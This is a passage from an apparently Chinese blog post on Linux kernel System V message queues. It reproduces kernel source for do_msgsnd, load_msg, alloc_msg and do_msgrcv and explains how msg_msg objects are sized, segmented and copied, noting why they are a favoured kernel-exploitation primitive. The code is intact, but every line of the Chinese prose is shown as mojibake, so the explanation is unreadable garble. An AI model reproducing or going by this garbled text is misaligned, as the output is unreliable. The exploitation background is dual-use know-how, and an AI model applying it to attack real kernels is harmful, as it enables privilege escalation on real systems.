rcu_read_lock();</span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line">		ss_del(&amp;s);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">			err = -ERESTARTNOHAND;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_update_pid(&amp;msq-&gt;q_lspid, task_tgid(current));</span><br><span class="line">	msq-&gt;q_stime = ktime_get_real_seconds();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pipelined_send(msq, msg, &amp;wake_q)) &#123;</span><br><span class="line">		<span class="comment">/* no one is waiting for this message, enqueue it */</span></span><br><span class="line">		list_add_tail(&amp;msg-&gt;m_list, &amp;msq-&gt;q_messages);</span><br><span class="line">		msq-&gt;q_cbytes += msgsz;</span><br><span class="line">		msq-&gt;q_qnum++;</span><br><span class="line">		atomic_add(msgsz, &amp;ns-&gt;msg_bytes);</span><br><span class="line">		atomic_inc(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = <span class="number">0</span>;</span><br><span class="line">	msg = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (msg != <span class="literal">NULL</span>)</span><br><span class="line">		free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°é¦–å…ˆå¯¹msgtypeå’Œmsgszè¿›è¡Œäº†æ£€æŸ¥ï¼Œç„¶åè°ƒç”¨<code>load_msg(mtext, msgsz)</code>æ¥åˆå§‹åŒ–<code>msg_msg</code>ç»“æ„ä½“</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ä¼šå…ˆè°ƒç”¨<code>alloc_msg</code>æ¥è¯·æ±‚msg_msgç»“æ„ä½“æ‰€éœ€è¦çš„ç©ºé—´.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è¿™ä¸ªå‡½æ•°å¯ä»¥çœ‹å‡ºmsgç»“æ„ä½“æ˜¯å¯ä»¥æ‰©å……çš„ï¼Œå¯ä»¥ä»<code>0x40</code>æ‰©å……åˆ°<code>0x1000</code>,è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆmsg_msgåˆ©ç”¨çš„èŒƒå›´è¿™ä¹ˆå¹¿äº†ã€‚</p>
<p>è€Œä¸”å½“æ¶ˆæ¯é•¿åº¦è¶…è¿‡äº†<code>0x1000-0x30</code>è¿˜å¯ä»¥å§æ¶ˆæ¯è¿›è¡Œåˆ†æ®µï¼Œæœ€å¤šåˆ†ä¸‰æ®µï¼Œç»“æ„å›¾å¦‚ä¸‹ï¼Œæ‰€ä»¥ä¸€ä¸ªæ¶ˆæ¯çš„é•¿åº¦ç†è®ºä¸Šæœ€å¤šæ˜¯<code>0x3000-0x30-0x8-0x8</code></p>
<p><img src="https://img-blog.csdnimg.cn/3fcc181ebcc04b70b425a27f57ac166b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYnJlZXplT19v,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å‡½æ•°ç”³è¯·å®Œæ‰€æœ‰ç©ºé—´å°±è¿”å›åˆ°<code>load_msg</code>å‡½æ•°ã€‚</p>
<p>ç„¶å<code>load_msg</code>æŠŠç”¨æˆ·ç©ºé—´çš„æ¶ˆæ¯å…¨éƒ¨å¤åˆ¶åˆ°åˆšç”³è¯·çš„msg_msgå’Œmsg_msgsegä¸Šï¼Œå°±è¿”å›åˆ°<code>do_msgsnd</code>å‡½æ•°ä¸­ï¼Œè¿™ä¸ªå‡½æ•°å‰©ä¸‹çš„å·¥ä½œå°±æ˜¯ç»è¿‡ä¸€å †æ£€æŸ¥ç„¶åæŠŠmsg_msgé“¾æ¥åˆ°å¯¹åº”çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­å»ï¼Œæ¶ˆæ¯é˜Ÿåˆ—ç¤ºæ„å›¾å¦‚ä¸‹ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/41f3e8fb8b054310ac6d3b18f6b13a4d.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h4 id="msgrcv"><a href="#msgrcv" class="headerlink" title="msgrcv()"></a>msgrcv()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å‚æ•°msqidï¼šæŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—idï¼Œç”±msgget è¿”å›ã€‚<br>å‚æ•°msgpï¼šæ¥æ”¶æ¶ˆæ¯ç”¨çš„ç»“æ„ä½“æŒ‡é’ˆ<br>å‚æ•°msgszï¼šæ¥æ”¶æ¶ˆæ¯ç”¨çš„ç»“æ„ä½“å¤§å°<br>å‚æ•°msgtypï¼šä¸‰ç§æƒ…å†µï¼š<br>=0 : è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªæ¶ˆæ¯</p>
<p>0 : è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸­ç±»å‹ä¸ºmsgtyp çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯ï¼Œå¦‚æœmsgflg è®¾ç½®äº†MSG_EXCEPT åˆ™ä¼šè¯»å–émsgtypç±»å‹çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯ï¼Œ è¿™ä¸ªæ¶ˆæ¯ç±»å‹åœ¨msgsnd é‡Œç”¨msgbuf ç»“æ„ä½“æŒ‡å®šçš„ï¼›å¦‚æœmsgflg è®¾ç½®äº†MSG_COPYåˆ™ä¼šè¯»å–é˜Ÿåˆ—ä¸­çš„ç¬¬msgtypä¸ªæ¶ˆæ¯ã€‚<br>&lt;0 : è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸­æœ€å°ç±»å‹ä¸”å°äºç­‰äºmsgtyp ç»å¯¹å€¼çš„æ¶ˆæ¯ã€‚<br>å‚æ•°msgflgï¼šé€šå¸¸ä½¿ç”¨ä¸‹é¢çš„ä¸€äº›flagï¼š<br>IPC_NOWAIT : æ¶ˆæ¯é˜Ÿåˆ—ä¸ºç©ºåˆ™ä¸ä¼šé˜»å¡ã€‚<br>MSG_EXCEPT : è·Ÿä¸Šé¢msgtyp è”ç”¨ï¼Œè¯»å–ç±»å‹ä¸æ˜¯msgtyp çš„ç¬¬ä¸€æ¡æ¶ˆæ¯ã€‚<br>MSG_NOERROR : æ¶ˆæ¯é•¿åº¦è¶…è¿‡msgsz æ—¶æˆªæ–­æ¶ˆæ¯ã€‚<br>MSG_COPY : æ¼æ´åˆ©ç”¨ä¸­ä¼šç”¨åˆ°ï¼Œå†…æ ¸ä¼šæŠŠæ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯æ‹·è´ä¸€ä»½è¿”å›ç”¨æˆ·ç©ºé—´è€Œä¸ä¼šé‡Šæ”¾è¯¥æ¡æ¶ˆæ¯ç»“æ„ã€‚<br>è¿”å›å€¼ï¼šæˆåŠŸæ—¶è¿”å›è¯»å–çš„æ¶ˆæ¯å­—èŠ‚æ•°ï¼Œå¤±è´¥è¿”å›-1ã€‚</p>
</blockquote>
<p>å†…æ ¸ä¼šè°ƒç”¨<code>do_msgrcv()</code>å‡½æ•°,è¿™ä¸ªå‡½æ•°å°±ä¼šæ ¹æ®msgtypeå’Œmsgflgæ¥æœç´¢åˆ°msg,ç„¶åæŠŠè¿™ä¸ªmsgæ‹·è´åˆ°ç”¨æˆ·ç©ºé—´çš„<code>buf</code>å¤„ï¼Œå½“msgflg!=<code>MSG_COPY</code>çš„æ—¶å€™ ï¼Œæ‰¾åˆ°msgåå°±ä¼šæŠŠè¿™ä¸ªmsgä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­unlink,ç„¶åæŠŠä¿¡æ¯å¤åˆ¶ç»™ç”¨æˆ·ç©ºé—´ï¼Œç„¶åå†freeè¿™ä¸ª<code>msg</code>ã€‚</p>
<p>ä½†æ˜¯å½“msgflg=<code>MSG_COPY</code>çš„æ—¶å€™ï¼Œä¼šå…ˆç”³è¯·ä¸€ä¸ªæ–°çš„msg,ç„¶ååœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ‰¾åˆ°ä¸€ä¸ªmsg,ç„¶åæŠŠè¿™ä¸ªmsgæ‹·è´åˆ°æ–°çš„msgä¸­ã€‚ç„¶åå†æŠŠæ–°çš„msgçš„å†…å®¹æ‹·è´åˆ°ç”¨æˆ·æ€ï¼Œæœ€åé‡Šæ”¾æ–°çš„<code>msg</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">	       <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">	&#125;</span><br><span class="line">	mode = convert_mode(&amp;msgtyp, msgflg);</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msq);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_receiver</span> <span class="title">msr_d</span>;</span></span><br><span class="line"></span><br><span class="line">		msg = ERR_PTR(-EACCES);</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IRUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line"></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			msg = ERR_PTR(-EIDRM);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">		<span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">				msg = ERR_PTR(-E2BIG);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">				msg = copy_msg(msg, copy);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			list_del(&amp;msg-&gt;m_list);</span><br><span class="line">			msq-&gt;q_qnum--;</span><br><span class="line">			msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">			ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">			msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">			atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">			atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">			ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* No message waiting. Wait for a message */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123;</span><br><span class="line">			msg = ERR_PTR(-ENOMSG);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		list_add_tail(&amp;msr_d.r_list, &amp;msq-&gt;q_receivers);</span><br><span class="line">		msr_d.r_tsk = current;</span><br><span class="line">		msr_d.r_msgtype = msgtyp;</span><br><span class="line">		msr_d.r_mode = mode;</span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; MSG_NOERROR)</span><br><span class="line">			msr_d.r_maxsize = INT_MAX;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			msr_d.r_maxsize = bufsz;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* memory barrier not require due to ipc_lock_object() */</span></span><br><span class="line">		WRITE_ONCE(msr_d.r_msg, ERR_PTR(-EAGAIN));</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* memory barrier not required, we own ipc_lock_object() */</span></span><br><span class="line">		__set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Lockless receive, part 1:</span></span><br><span class="line"><span class="comment">		 * We don&#x27;t hold a reference to the queue and getting a</span></span><br><span class="line"><span class="comment">		 * reference would defeat the idea of a lockless operation,</span></span><br><span class="line"><span class="comment">		 * thus the code relies on rcu to guarantee the existence of</span></span><br><span class="line"><span class="comment">		 * msq:</span></span><br><span class="line"><span class="comment">		 * Prior to destruction, expunge_all(-EIRDM) changes r_msg.</span></span><br><span class="line"><span class="comment">		 * Thus if r_msg is -EAGAIN, then the queue not yet destroyed.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		rcu_read_lock();</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Lockless receive, part 2:</span></span><br><span class="line"><span class="comment">		 * The work in pipelined_send() and expunge_all():</span></span><br><span class="line"><span class="comment">		 * - Set pointer to message</span></span><br><span class="line"><span class="comment">		 * - Queue the receiver task for later wakeup</span></span><br><span class="line"><span class="comment">		 * - Wake up the process after the lock is dropped.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * Should the process wake up before this wakeup (due to a</span></span><br><span class="line"><span class="comment">		 * signal) it will either see the message and continue ...</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		msg = READ_ONCE(msr_d.r_msg);</span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN)) &#123;</span><br><span class="line">			<span class="comment">/* see MSG_BARRIER for purpose/pairing */</span></span><br><span class="line">			smp_acquire__after_ctrl_dep();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		 <span class="comment">/*</span></span><br><span class="line"><span class="comment">		  * ... or see -EAGAIN, acquire the lock to check the message</span></span><br><span class="line"><span class="comment">		  * again.</span></span><br><span class="line"><span class="comment">		  */</span></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		msg = READ_ONCE(msr_d.r_msg);</span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		list_del(&amp;msr_d.r_list);</span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">			msg = ERR_PTR(-ERESTARTNOHAND);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">	free_msg(msg);</span><br><span class="line"></span><br><span class="line">	<span 